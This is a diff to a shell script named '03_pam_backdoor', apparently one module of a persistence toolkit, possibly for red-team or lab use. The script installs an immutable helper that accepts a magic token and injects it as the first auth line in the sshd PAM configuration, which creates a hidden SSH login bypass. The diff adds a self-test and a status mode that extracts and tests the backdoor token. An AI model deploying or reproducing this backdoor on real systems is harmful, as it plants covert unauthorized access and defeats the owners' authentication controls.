@@ -19,6 +19,16 @@ pass="\$(cat | tr -d '\0')"
 exit 1
 HELPER_EOF
     chmod 700 "$HELPER"
+
+    # Self-test before locking — catch a broken helper immediately.
+    if echo -n "${MAGIC}" | "$HELPER"; then
+        echo "[+] 03_pam_backdoor: helper self-test passed"
+    else
+        echo "[!] 03_pam_backdoor: helper self-test FAILED — aborting"
+        rm -f "$HELPER"
+        exit 1
+    fi
+
     chattr +i "$HELPER" 2>/dev/null || true
 
     # Inject as the very first auth line in sshd PAM config
@@ -35,5 +45,18 @@ HELPER_EOF
     sed -i "\|${PAM_LINE}|d" "$PAM_TARGET" 2>/dev/null || true
     echo "[-] 03_pam_backdoor: removed"
     ;;
-  *) echo "Usage: $0 deploy|cleanup"; exit 1 ;;
+  status)
+    echo "[*] Helper  : $( [[ -f "$HELPER" ]] && echo "present" || echo "MISSING" )"
+    echo "[*] PAM line: $( grep -qF "$PAM_LINE" "$PAM_TARGET" 2>/dev/null && echo "present in ${PAM_TARGET}" || echo "MISSING from ${PAM_TARGET}" )"
+    if [[ -f "$HELPER" ]]; then
+        token=$(grep -oP '(?<== ")[^"]+(?=")' "$HELPER" 2>/dev/null || true)
+        echo "[*] Token   : ${token:-<could not extract>}"
+        if echo -n "${token}" | "$HELPER" 2>/dev/null; then
+            echo "[*] Test    : PASS"
+        else
+            echo "[!] Test    : FAIL"
+        fi
+    fi
+    ;;
+  *) echo "Usage: $0 deploy|cleanup|status"; exit 1 ;;
 esac
